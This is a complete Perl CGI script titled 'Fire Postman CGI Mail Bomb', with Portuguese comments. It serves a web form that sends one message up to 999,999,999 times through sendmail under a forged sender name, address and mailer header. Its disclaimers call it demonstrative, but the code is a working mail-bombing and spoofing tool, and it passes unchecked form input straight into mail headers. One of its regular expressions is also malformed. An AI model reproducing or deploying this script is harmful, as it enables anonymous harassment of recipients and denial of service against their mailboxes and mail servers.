#!/usr/bin/perl
###########################################################
#
# Fire Postman CGI Mail Bomb
# Copyright © 1999-2001 iradium
# All Rights Reserved.
#
# www.comandotrojan.jb.net
#
#
# Assuma seus Atos
# Estrutura meramente demonstrativa
#
###########################################################
#
# Configure estas linhas de acordo com seu servidor

# O caminho do programa de email, com o nível -t
$mailprog = '/usr/sbin/sendmail -t';

# Endereço real de seu cgi
$cgi_local = 'http://www.yourdomain.com/cgi-bin/cgi_bomb.cgi';

# Abaixo não mude nada !
##############################################################





if($ENV{'REQUEST_METHOD'} eq 'POST')
{
	&parse_form;
	$sent = 0;
	$stop = $input{'stop'};
if($stop eq '') { $stop = 1; }
if($stop < 0) { &error; }
if($stop > 999999999) { &error; }

	&return_html;
	&send_mail;
}
else
{
&print_form;
}


sub print_form
{
print "Content-type: text/html\n\n";
print "
<html><head><title>Fire PostMan CGI Mail Bomb</title></head>
<body bgcolor=000000 text=ffffff link=000000 alink=000000 vlink=000000>
<center><h1>CGIBomber v1.0</h1></center>
<br><hr><br>
CGIBomber is a fully capable e-mail bomber program. This program was written to
show how simple it is to send anonymous e-mail bombs via a cgi script. This program
is <b>not</b> intended to be used (unlike most people, I really mean that). If
you do use this program, I take no responsibility whatsoever. See the <a href=\"#disc\">disclaimer</a>
below. This program uses large ammounts of system resources, if your sysadmin finds you
running this script you are very likely to lose your account and possibly more. 
I do not endorse e-mail bombing or any other type of harassment.<br>E-HACK


<br><hr><br>

<center>
<form action=\"$cgi_local\" method=POST>
<table border=1>
<th colspan=2><font face=verdana color=ffffff>Fire PostMan CGI Mail Bomb</th>
<tr><td>To:</td><td><input type=text name=\"to\" size=60></td></tr>
<tr><td>From:</td><td><input type=text name=\"from_addy\" size=60></td></tr>
<br><td>From Name:</td><td><input type=text name=\"from_name\" size=60></td></tr>
<tr><td>Subject:</td><td><input type=text name=\"subject\" size=60></td></tr>
<tr><td># Send:</td><td><input type=text name=\"stop\" value=\"1\" size=5></td></tr>
<tr><td>Virtual Mailer</td><td><input type=text name=\"fodao\" size=60></td></tr>
<tr><td colspan=2>Body:<br><textarea name=\"body\" wrap=virtual rows=5 cols=60></textarea></td></tr>
<tr><td colspan=2>
</td></tr>
<tr><td colspan=2 align=center><BR><BR><input type=submit value=\" Send \">
<input type=reset value=\" Clear \">
</td></tr>
</table></form></center>

</body></html>";



}



sub send_mail
{
open (MAIL, "|$mailprog") || die "Can't open $mailprog!\n";
# Headers of the e-mail------------------------------------------
print MAIL "From: $input{'from_name'} \<$input{'from_addy'}\>\n";
print MAIL "Reply-To: $input{'from_addy'}\n";
print MAIL "X-Mailer: $input{'fodao'}\n";
print MAIL "To: $input{'to'}\n";
print MAIL "Subject: $input{'subject'}\n";
print MAIL "Content-Type: text/plain; charset=us-ascii\n";
print MAIL "Content-Transfer-Encoding: 7bit\n\n";
# Body of the e-mail---------------------------------------------
print MAIL "$input{'body'}";
close (MAIL);

$sent++;

	if($sent >= $stop)
	{
	exit;
	}
	else
	{
	&send_mail;
	}
}

sub return_html
{
print "Content-type: text/html\n\n";
print "<HTML><HEAD><TITLE>Fire PostMan CGI Mail Bomb - Bomber Sent</TITLE></HEAD><BODY>";
print "<CENTER><H1>Mail is being sent</CENTER></H1>\n";
print "You e-mail is being sent.<br>Here's what you sent:\n";
print "<PRE>";
print "$input{'custom_headers'}\n";
print "From: $input{'from_name'} \<$input{'from_addy'}\>\n";
print "Reply-To: $input{'from_addy'}\n";
print "X-Mailer: $input{'fodao'}\n";
print "To: $input{'to'}\n";
print "Subject: $input{'subject'}\n";
print "Content-Type: text/plain; charset=us-ascii\n";
print "Content-Transfer-Encoding: 7bit\n\n";
# Body of the e-mail---------------------------------------------
print "$input{'body'}";
print "</PRE><BR><HR><BR>This e-mail is being sent $input{'stop'} times.\n";
print "<br><hr><br></body></html>\n";
exit;
}

sub parse_form {

   read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
   if (length($buffer) < 5) {
         $buffer = $ENV{QUERY_STRING};
    }
   @pairs = split(/&/, $buffer);
   foreach $pair (@pairs) {
      ($name, $value) = split(/=/, $pair);

	$value =~ tr/+/ /;
	$value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
	$value =~ s/<!--(.|\n)*-->//g;
	$input{$name} = $value;
   }

	if($input{'to'} =~ /zipmail.com.br/) { &error; }
	if($input{'to'} =~ /mailbr.com.br/) { &error; }
	if($input{'to'} =~ /popozao.com) { &error; }
	if($input{'to'} =~ /hotmail.com.br/) { &error; }
	if($input{'to'} =~ /microsoft.com.br/) { &error; }
	if($input{'to'} =~ /globo.com/) { &error; }
	if($input{'to'} =~ /uol.com.br/) { &error; }
	if($input{'to'} =~ /terra.com.br/) { &error; }
}


sub error
{
print "Content-type: text/html\n\n";
print "<HTML><HEAD><TITLE>Fire PostMan CGI Mail Bomb Error</TITLE></HEAD><BODY>\n";
print "<CENTER><H1>Fire PostMan CGI Mail Bomb Error</CENTER></H1>\n";
print "<BR>An error occured while processing the script.\n";
print "<BR><HR><BR></BODY></HTML>\n";
exit;
}

